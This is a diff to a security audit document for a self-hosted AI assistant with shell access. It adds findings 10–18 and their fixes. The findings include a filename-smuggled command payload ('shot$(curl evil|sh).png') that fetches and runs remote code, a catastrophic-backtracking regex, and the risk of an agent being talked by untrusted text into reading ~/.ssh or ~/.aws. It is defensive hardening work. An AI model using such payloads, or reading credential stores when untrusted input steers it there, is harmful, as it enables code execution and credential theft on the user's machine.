@@ -38,6 +38,15 @@ those 91 tests fail against `5242ea2`.**
 | 7 | Timed-out shell command orphaned grandchildren that ran forever | **Medium** | Fixed + tested |
 | 8 | Malformed JSON body answered `200` instead of `400` | Low | Fixed + tested |
 | 9 | 3 MB body and `%zz` in a path each produced `500` | Low | Fixed + tested |
+| 10 | **Second pass (2026-10-31).** `screenshot` interpolated a filename into a shell string → arbitrary command execution | **Critical** | Fixed + tested |
+| 11 | `grep` compiled a model-supplied regex with no bound → event-loop DoS | **Critical** | Fixed + tested |
+| 12 | Approval prompts showed argument *names*, not values | **High** | Fixed + tested |
+| 13 | A cookie was ambient authority for `/api/*`; CORS reflected any loopback port | **High** | Fixed + tested |
+| 14 | "yes" in the web panel answered the approval **and** started a second agent turn | **High** | Fixed + tested |
+| 15 | Credential stores (`~/.ssh`, `~/.aws`) were readable when the workspace was `$HOME` | **High** | Fixed + tested |
+| 16 | A reminder could be delivered twice when a tick outlived the 15 s interval | **Medium** | Fixed + tested |
+| 17 | A model stream that closed early was stored as a complete answer | **Medium** | Fixed + tested |
+| 18 | The honesty guard flagged emails/URLs quoted from an attachment as invented | **Medium** | Fixed + tested |
 
 Severity here means: *given the intended deployment — a personal assistant you message all
 day, with shell access to your machine and an LLM reading untrusted text.* Under that
@@ -511,7 +520,114 @@ Honesty is the feature. These are known, accepted, and documented rather than hi
 | `PINCH_ENV_PASSTHROUGH` re-admits chosen secrets | Needed for real builds | Explicit, per-name opt-in |
 | No TLS in the built-in server | A local-first tool should not ship certificate management | Put it behind a proxy if you expose it; `PINCH_ALLOWED_HOSTS` covers the hostname, not the transport |
 | WhatsApp channel (unofficial) | Not the official API | Off by default; ToS and ban risk documented in `docs/CHANNELS.md` |
+| Relative `cd ../../..` is not flagged by `describeEscapes` | It cannot be resolved lexically at all | The command itself is shown to the human at the approval prompt |
+| The shell screen is a denylist | An infinite space of shell syntax | Documented; the approval gate is the control, and it now shows argument values |
+| `grep` costs up to 3 s before it is killed | A worker thread per call | Bounded, and the message explains it |
 | `data/sessions` is read wholesale to list sessions | Simplicity, at 13 ms for 300 sessions | Fine to thousands of sessions; a real database would break "read your own data with `cat`" |
+
+---
+
+## 10–18. Second pass, 2026-10-31
+
+A full review of the source — not the README — found two exploitable defects and six
+correctness ones. Every entry below was **reproduced before it was fixed**, and each has a
+regression test in `test/hardening.test.js` written from the reproduction rather than from
+the patch.
+
+### 10. Command injection through `screenshot` — Critical
+
+`screenshot` built a command string from a workspace-validated path:
+
+```js
+const cmd = `screencapture -x "${target}"`;
+const res = await runShell(cmd, { timeoutMs: 15_000 });   // spawn(..., { shell: true })
+```
+
+Double quotes do not stop `$( )` inside them. `resolveInWorkspace` proves a path is *inside
+the workspace*; it says nothing about shell metacharacters, and `shot$(curl evil|sh).png` is
+a legal filename in there. The tool then reported "could not take a screenshot", which is
+what made it invisible.
+
+Reproduced: a file created outside the workspace by the payload, while the tool reported
+failure. The Windows branch was worse — it interpolated into a PowerShell `-Command` string.
+
+**Fix.** `runProgram()` runs a binary with an argv array and `shell: false`; the screenshot
+path picks a candidate list and tries them in order. On Windows the path travels in an
+environment variable, never in the script text. `checkFilename()` refuses `$`, backtick,
+`|`, `;`, `&`, `<`, `>` and newlines before anything is run — defence in depth, not the fix
+itself.
+
+### 11. A model-supplied regex could wedge the process — Critical
+
+`grep` did `new RegExp(pattern, "i")` where `pattern` came from the model. Node has no
+regex timeout, and this ran on the main thread. `^(a+)+$` against a line of `a`s ending in
+`!` is exponential: the call never returned, and **the whole assistant froze** — every
+channel, the SSE stream, the scheduler.
+
+**Fix.** The scan runs in `src/grep-worker.js`, terminated after 3 s. The model gets an
+actionable message ("avoid nested quantifiers like `(a+)+`") because a model told
+"too expensive" will simplify, while a model that gets silence retries.
+
+### 12. The human gate could not see what it was approving — High
+
+`describeCall` fell back to `name(key, key, key)`, so the prompt for `screenshot` read
+`screenshot(path)` and showed the word "path" — while the value was the payload. The
+approval gate is the load-bearing control in this design; a gate that withholds the argument
+is a formality.
+
+**Fix.** Values are shown, truncated to 120 characters, with shell metacharacters called out.
+
+### 13. A cookie was ambient authority — High
+
+`hostnameOf()` compared hostnames, not ports, so `http://127.0.0.1:9999` counted as an
+allowed origin — and any page on any loopback port, including a stray dev server or a
+postinstall script, was sent our cookie and received a reflected `Access-Control-Allow-Origin`.
+That is read access to `/api/session/*` (every conversation) and `/api/memory`.
+
+**Fix.** `/api/*` accepts the key as a header or query parameter only; the cookie now exists
+solely to load the static page, and is `HttpOnly; SameSite=Strict`. CORS reflects an Origin
+only when host **and port** match this server. Boot also refuses to be quietly open: no key
+plus the default wildcard bind now narrows to loopback and says how to get the phone back.
+
+### 14. "yes" ran the agent twice — High
+
+`POST /api/chat` answered the pending approval and then **fell through** into `runAgent`,
+so "yes" was also sent to the model as a question. Two turns interleaved on one session, and
+the answer to the first arrived above the answer to the second. The chat channels never had
+this bug — `router.js` returns.
+
+**Fix.** Return after answering, and send a `final` event so the panel closes cleanly.
+
+### 15. Credential stores were inside the default sandbox — High
+
+`PINCH_WORKSPACE` defaults to `$HOME`, so "inside the workspace" included `~/.ssh`,
+`~/.aws`, `~/.gnupg`. The agent had no business reading them; the one time it would is the
+time it has been talked into it by a page, a tool output or a document.
+
+**Fix.** A fixed `PROTECTED` list is refused by `resolveInWorkspace` regardless of the
+workspace root.
+
+### 16. A reminder could arrive twice — Medium
+
+`tick()` is async and `setInterval` does not await it; `fired` is only written after the
+channel accepts the message. A channel slower than 15 s let the next tick see the same
+reminder pending. Reproduced: two deliveries. **Fix.** an in-flight guard, plus the next
+reminder is now chosen by soonest rather than by insertion order.
+
+### 17. A cut stream was stored as an answer — Medium
+
+`streamLines` ignored `done: true` / `finish_reason`, so a provider that closed mid-sentence
+returned `"The answer is 42, and here is"` as a completed reply, which went into history as
+fact. The honesty guard audits claims, not completeness — it cannot catch this. **Fix.**
+both providers now require a finish signal and throw otherwise; `finish_reason: "length"`
+is labelled in the reply.
+
+### 18. The guard punished correct behaviour — Medium
+
+The user message persisted is the bare text, and `auditReply` was given the same bare text —
+so a reply quoting an invoice attached as a PDF was flagged as inventing the address. A
+guard with false positives gets switched off, and then the true positives are gone too.
+**Fix.** the attachment text is part of the evidence set.
 
 ---
 
